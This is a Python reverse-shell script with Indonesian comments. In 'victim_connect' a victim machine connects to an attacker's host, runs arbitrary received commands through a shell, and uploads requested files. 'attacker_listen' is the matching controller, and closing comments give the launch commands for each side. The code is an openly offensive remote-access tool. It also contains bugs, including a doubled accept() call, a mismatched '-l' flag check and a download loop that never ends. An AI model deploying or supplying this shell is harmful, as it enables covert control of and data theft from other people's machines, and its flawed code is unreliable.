import getopt
# berfungsi untuk mengambil inputan yang masuk di terminal
import sys
# membuat koneksi
import socket
# berfungsi untuk memproses komen yang akan menghasilkan output
import subprocess
from os import chdir

# buat socket
S = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
TARGET = ""
PORT = 0
LISTEN = False


def attacker_listen():
    global S, PORT
    # ini akan menghubungkan ke semua op yang kita miliki
    host = "0.0.0.0"
    S.bind((host, PORT))
    S.listen()

    # saat listen mendapat koneksi maka kita akan harus menangkap koneksinya
    # koneksi yang ditangkap akan return 2 yaitu socket dan address nya
    S.accept()
    con, addr = S.accept()
    print(con.recv(4096).decode())

    while True:
        cmd = input("> ")
        con.send(cmd.encode())

        if cmd.startswith("download "):
            file_name = cmd.split(" ")[1]
            f = open(file_name, "wb")

            while True:
                content = con.recv(4096)

                if content != b"Complete":
                    f.write(content)
            f.close()
        if cmd == "exit":
            break
        else:
            output = con.recv(4096).decode()
            print(output)


def victim_connect():
    global S, PORT, TARGET
    # membutuhkan target untuk bisa connect

    S.connect((TARGET, PORT))
    S.send("Connected!".encode())

    while True:
        cmd = S.recv(4096).decode()

        if cmd.startswith("download"):
            file_name = cmd.split(" ")[1]
            f = open(file_name, "rb")

            for i in f:
                S.send(i)
            S.send("Complete".encode())
            f.close

        elif cmd == "exit":
            break

        else:
            if cmd[:2] == "cd":
                chdir(cmd[3:])
                output = f"Succesfully change diretory to{cmd[3:]}".encode()
                # ini buat eksekusi komennya
                # shell buat jalanin sebagai shell
            else:
                cmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)

                output = cmd.stdout.read()

            S.send(output)


def get_argument():
    global TARGET, PORT, LISTEN

    try:
        args, _ = getopt.getopt(sys.argv[1:], "t:p:l")
    except:
        print("try again")

    for key, value in args:
        if key == "-t":
            TARGET = value
        elif key == "-p":
            PORT = int(value)
        elif key == "-1":
            LISTEN = True


def main():
    global TARGET, PORT, LISTEN

    get_argument()

    if LISTEN:
        attacker_listen()
    else:
        victim_connect()


if __name__ == "__main__":
    main()

# kalau mengaktifkan attacker menggunakan python shell.py -t 127.0.0.1 -p 4444 -l
# kalau victim cara mengaktifkan python shell.py -t 127.0.0.1 -p 4444
